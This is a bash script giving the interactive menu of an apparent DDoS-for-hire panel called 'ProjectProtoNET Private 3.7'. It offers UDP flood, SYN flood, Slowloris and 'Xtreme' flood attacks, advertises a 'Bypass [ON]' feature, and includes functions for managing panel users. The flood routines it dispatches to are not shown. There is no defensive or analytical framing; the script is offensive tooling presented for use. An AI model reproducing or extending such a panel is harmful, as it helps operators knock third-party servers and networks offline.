Take_input1()
{
clear
while :
do
clear
echo -e "${WHITE}Created By PROTONET${RED}                           User:"${LIGHTBLUE}OWNER"${RED}Expires:"${LIGHTBLUE}Never
echo -e "${WHITE}                                                PRIVATE MENU 3.7 ENJOY
                                        "${WHITE}Your Version: "${GREEN}v3.7 "${RED}[Private Verison]
echo -e "${WHITE}
   #   P   r   o   j   e   c   t            ProjectProtoNET Private 3.7 ${WHITE}
  / \ / \ / \ / \ / \ / \ / \ / \         --------------------------------${CYAN}
 ( P | R | O | T | O | N | E | T )${LIGHTBLUE}        ¦VPS: RAM 4GO BANDWICH: 1GBPS  ¦${WHITE}
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------
"${WHITE}
    echo -e "${WHITE}Note: "${GREEN}TO EXIT A SCRIPT OR STOP ATTACKS PRESS [CTRL+C]
    echo""
	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                            [11] ADMIN DSTAT "                                                                                         																									
    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${LIGHTBLUE}                          [12] Lock User And Kill Attacks"
    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${LIGHTBLUE}                         [13] ADD USER"
    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${LIGHTBLUE}                            [14] DELETE USER"
    echo -e "${LIGHTBLUE}[5]${GREEN}PROTONET SCRIPT${LIGHTBLUE}                      [15] List of Processes" 
    echo -e "${LIGHTBLUE}[6]${GREEN}Bandwidth${LIGHTBLUE}                            [16] Whos On ?"
    echo -e "${LIGHTBLUE}[7]${GREEN}SyN Flood${LIGHTBLUE}                            [17] Home Panel"
    echo -e "${LIGHTBLUE}[8]${GREEN}Kill Attacks${BLUE}"
    echo -e "${LIGHTBLUE}[9]${LIGHTBLUE}Change Password${CYAN}"
	echo -e "${LIGHTBLUE}[10]${LIGHTBLUE}MULTI UPDATED${CYAN}"
    echo -e "                                                              Bypass [${GREEN}ON${CYAN}]"
    echo -n "#ProjectProtoNET - Enter Your Menu Choice [1-17]: "
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
      3) slap ;;
	  4) slowloris ;;
	  5) fry ;;
         6) bw ;;
         7) syn ;;
	  8) killall ;;
	  9) passwd ;;
	  10) multi ;;
	  11) dstat1 ;;
	  12) lockkill ;;
      13) adduser ;;
      14) deluser ;;
      15) lstprocesses ;;
      16) whoson ;;
	  17) panel ;;
      ex) echo "As you Command" ;  exit 1  ;;
	  end) pkill menu  ;;
      *) echo "Invalid Selection, Please make another selection between [1-11]" ;
         echo "Press Enter. . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1